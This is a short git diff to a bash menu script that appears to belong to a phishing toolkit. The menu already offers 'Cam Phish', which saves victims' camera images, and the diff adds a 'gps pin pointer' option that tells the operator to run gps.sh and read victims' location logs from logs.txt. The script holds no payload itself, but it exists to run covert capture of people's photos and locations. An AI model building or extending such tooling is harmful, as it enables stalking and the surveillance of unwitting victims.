@@ -5,6 +5,7 @@ clear
 
 # Display menu options
 echo "1. Cam Phish"
+echo "2. gps pin pointer"
 echo "0. Exit"
 
 # Read user input
@@ -18,6 +19,13 @@ case $choice in
         echo "Find the victims imgs in cd tools/phishers/imgs"
         read -p "Press [Enter] to return to the menu or exit..."
         ;;
+    2)
+        # Display a message and wait for user to press Enter
+        echo "Start gps pin pointer by saying cd tools/phishers and then bash gps.sh"
+        echo "Find the victims logs in cd tools/phishers/ and then open logs.txt"
+        read -p "Press [Enter] to return to the menu or exit..."
+        ;;
+    
     0)
         # Exit the script
         echo "Exiting..."
